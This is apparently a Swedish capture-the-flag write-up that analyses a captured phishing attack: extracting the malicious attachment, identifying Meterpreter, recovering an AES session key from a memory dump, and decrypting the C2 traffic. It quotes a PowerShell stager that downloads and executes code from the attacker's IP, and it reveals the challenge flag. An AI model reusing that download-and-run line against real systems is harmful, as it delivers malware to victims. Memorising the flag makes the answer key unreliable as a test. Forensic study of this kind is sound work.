## Teknisk beskrivning

Utmaningen består i att analysera en phishing attack. Analysen behöver ske i flera steg där man gräver sig vidare och skaffar sig information nog för att gå vidare med nästa steg. I sista steget kan man ur den inspelade trafiken extrahera de filer som "stulits" och i en av de filerna finns flaggan.

## Lösningsförslag

### Kortfattad version

1. Undersök filen *lost_in_space.pcapng* och hitta ledtrådar som tyder på att trafiken som syns är ett meterpreter reverse shell över http.

2. Extrahera C2-trafiken ur pcap-filen (tshark -r lost_in_space.pcapng -Y 'tcp.stream eq 3' -w meterpreter.pcapng)

2. Extrahera sessionsnyckeln (AES256) från processdumpen med bulk_extractor.

3. Skriv ett skript som avkodar C2-trafiken mha. sessionsnyckeln.

4. I filen *Very_Important_document.odt* finns flaggan.

### Lång version

PCAP-filen lost_in_space.pcapng kan med fördel analyseras med hjälp av wireshark/tshark, NetworkMiner eller liknande programvara. Filen innehåller 4 tcp-sessioner mellan Harriet Hopp (95.198.126.187) och den misstänkta hotaktören (95.198.77.123), och ger en ledtråd om vad som inträffat.

I tcp.stream 0 ($ tshark -r lost_in_space.pcapng -q -z follow,tcp,ascii,0) framgår att Harriet Hopp mottagit ett phishing-email från "servicedesk@PowerGloveInc.acme" med en krypterad bilaga i zip-format. Lösenordet till bilagan framgår utav texten i epostens meddelande: "1235".

Bilagan är bas64-formatterad och kan extraheras manuellt genom att klistra in bas64-strängen i cyberchef eller genom att använda följande oneliner:
```
└─$ tshark -r lost_in_space.pcapng -Y 'smtp' -T fields -e data | xxd -r -p | tr -d '\r\n' | base64 -d > powerglove_manual.zip
```

Ur zip-arkivet extraheras sedan filen powerglove_manual.pdf.js. Filen innehåller obfuskerad JavaSript som kan deobfuskeras med gratis onlineverktyg såsom https://obf-io.deobfuscate.io/

Det deobfuskerade skriptet innehåller två större bas64-blobbar av intresse. Den ena blobban är en PDF-fil som skriptet packar upp och visar för användaren i syfte att upprätthålla maskeraden som en PDF-fil. Den andra bas64-blobban innehåller desto mer intressant innehåll. Det går att utläsa att skriptet hämtar något från http://95.198.77.123/powerglove_icon.png som den försöker exekvera med hjälp av Powershell.

```
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$gS2=new-object net.webclient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){$gS2.proxy=[Net.WebRequest]::GetSystemWebProxy();$gS2.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};IEX ((new-object Net.WebClient).DownloadString('http://95.198.77.123/powerglove_icon.png/SHrZWHyiaTOir7e'));IEX ((new-object Net.WebClient).DownloadString('http://95.198.77.123/powerglove_icon.png'));
```

Nätverkstrafiken från detta skeende finns i nästa tcp-ström (tcp.stream eq 1). I paket 411 och 416 hämtas payloaden som består av obfuskerad powershell som sedan exekveras av skriptet. Att förstå varje bit och byte av detta är inte nödvändigt men väljer man att extrahera skriptet (md5: 2ab46558bc0e8bc6fd73af208ca7184e) och kör detta i exempelvis VirusTotal finns en ledtråd som hintar om att det rör sig om Meterpreter (https://www.virustotal.com/gui/file/794013e56da8fbce5f4d45796ec7d26bf912c29ed06132d8469505ef16dac4f1/community). 

I nästa TCP-ström (tcp.stream eq 2) laddas ytterligare en payload ned från den mycket suspekta url:en http://95.198.77.123:443/JOLoH5MjxkHTvtK8tIM4AguqPTdtQ_T9RMCcxLyFJgPyL4QJ3nhvj1j-Wa8e8O_xwED-jObfV6ZS88ad0585Z1BzgGhZh_XSpaz2G17DbAiAB6xDa271yDEiF318R

Dnna payload kan extraheras med följande kommando:
```
└─$ tshark -r lost_in_space.pcapng -Y 'tcp.stream eq 2' -T fields -e data | xxd -r -p > malware.dll
└─$ md5sum malware.dll 
a564721cdba389552c94e9d4e472eab5  malware.dll
```

Genom att återigen söka efter filen på VirusTotal kan man fastställa att det troligen rör sig om en PE/DLL tillhörandes Meterpreter.

Kvar återstår då den fjärde och sista tcp-strömmen (tcp.stream eq 3), där man finner ett antal suspekta GET och POST-anrop till 95.198.77.123/JOLoH5MjxkHTvtK8tPgIYAWSgEkbwF/.
En kvalificerad gissning säger att detta rimligen borde utgöra C2-trafik mellan den infekterade enheten och C2-servern.

Således är det rimligt att extrahera denna tcp-ström i en separat pcap för vidare bearbetning:
```
└─$ tshark -r lost_in_space.pcapng -Y 'tcp.stream eq 3' -w meterpreter.pcapng
```

Meterpreter-datan återfinns i HTTP-bodyn men tyvärr är trafiken krypterad! Som tur är så har Harriet Hopp varit vaksam och tillhandahållit en minnesdump av den misstänkta processen som hon upptäckt: powershell.exe.dmp, någonstans i denna dump borde det finns en sessionsnyckel som kan avkryptera trafiken!

Med hjälp av verktyget bulk_extractor kan man söka igenom minnedumpen och extrahera alla ev. AES-nycklar.
```
└─$ mkdir be
└─$ bulk_extractor powershell.exe.dmp -o be
└─$ cat be/aes_keys.txt    
# BANNER FILE NOT PROVIDED (-b option)
# BULK_EXTRACTOR-Version: 2.1.1
# Feature-Recorder: aes_keys
# Filename: powershell.exe.dmp
# Feature-File-Version: 1.1
60552042     11 1c 9f 8a 3a c1 3f 98 23 ea 07 4a 92 4f 8b 5f f4 da bd f2 99 dd a0 43 1d 08 87 59 3c b2 19 8c    AES256
```

Utmaningen är nu att förstå hur Meterpreter kommunicerar med sitt mål, reversera protokollet och extrahera de filer som exfiltrerats via hotaktörens reverse shell. 
Med lite google-jitsu kan man landa i några av nedanstående källor som ger lite hjälp på vägen: 
https://0xdfimages.gitlab.io/img/image-20230202154904655.webp
https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Packet
https://github.com/rapid7/mettle/blob/52de3c892701e0101746b46ee8b47b76cde8d2d4/mettle/src/tlv_types.h#L49-L307
https://0xdf.gitlab.io/2023/02/04/htb-response.html#meterpreter-traffic-decryption

Lösningsskriptet decrypt_msf.py har skickats med och kan köras enligt nedan:
```
└─$ python3 decode_msf.py --pcap meterpreter.pcapng --aes "11 1c 9f 8a 3a c1 3f 98 23 ea 07 4a 92 4f 8b 5f f4 da bd f2 99 dd a0 43 1d 08 87 59 3c b2 19 8c" --dump output_folder
...
[+] Dumping 2 file(s) found in pcap:
EDH.decklist.txt
a.zip

└─$ unzip output/a.zip 
Archive:  output/a.zip
  inflating: powerglove.config.bak   
  inflating: Powerglove_Status.jpg   
  inflating: safety_protocols.json   
  inflating: Very_Important_data.ods  
  inflating: Very_Important_document.odt
```

## Flaggan

I filen Very_Important_document.odt finns flaggan i "phishing_in_space": undut{🎣_in_🌌}

